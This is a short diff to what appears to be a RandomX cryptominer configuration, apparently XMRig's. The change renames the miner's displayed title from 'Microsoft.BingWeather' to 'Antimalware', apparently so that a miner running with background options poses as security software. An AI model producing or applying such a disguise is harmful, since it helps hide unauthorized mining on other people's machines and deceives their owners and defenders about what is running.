@@ -13,7 +13,7 @@
     "autosave": true,
     "background": false,
     "colors": true,
-    "title": "Microsoft.BingWeather",
+    "title": "Antimalware",
     "randomx": {
         "init": -1,
         "init-avx2": -1,
